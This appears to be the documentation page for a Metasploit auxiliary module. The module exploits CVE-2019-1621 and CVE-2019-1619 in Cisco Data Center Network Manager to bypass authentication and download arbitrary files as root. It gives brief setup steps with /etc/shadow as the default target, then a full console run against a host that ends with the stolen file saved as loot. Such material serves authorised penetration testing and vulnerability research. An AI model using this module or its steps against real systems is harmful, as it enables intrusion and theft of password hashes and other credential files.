## Vulnerable Application

Cisco Data Center Network Manager exposes a servlet to download files on /fm/downloadServlet.
An authenticated user can abuse this servlet to download arbitrary files as root by specifying
the full path of the file (aka CVE-2019-1621).

This module was tested on the DCNM Linux virtual appliance 10.4(2), 11.0(1) and 11.1(1), and should
work on a few versions below 10.4(2). Only version 11.0(1) requires authentication to exploit
(see References to understand why), on the other versions it abuses CVE-2019-1619 to bypass authentication.

## Scenarios

Setup RHOST, pick the file to download (FILENAME, default is /etc/shadow) and enjoy!

```
msf5 exploit(multi/http/cisco_dcnm_upload_2019) > use auxiliary/admin/cisco/cisco_dcnm_download

msf5 auxiliary(admin/cisco/cisco_dcnm_download) > set rhost 10.75.1.40
rhost => 10.75.1.40
msf5 auxiliary(admin/cisco/cisco_dcnm_download) > run

[+] 10.75.1.40:443 - Detected DCNM 10.4(2)
[*] 10.75.1.40:443 - No authentication required, ready to exploit!
[+] 10.75.1.40:443 - Got sysTime value 1567081446000
[+] 10.75.1.40:443 - Successfully authenticated our JSESSIONID cookie
[+] File saved in: /home/john/.msf4/loot/20190829122407_default_10.75.1.40_ciscoDCNM.http_855907.bin
[*] Auxiliary module execution completed
```
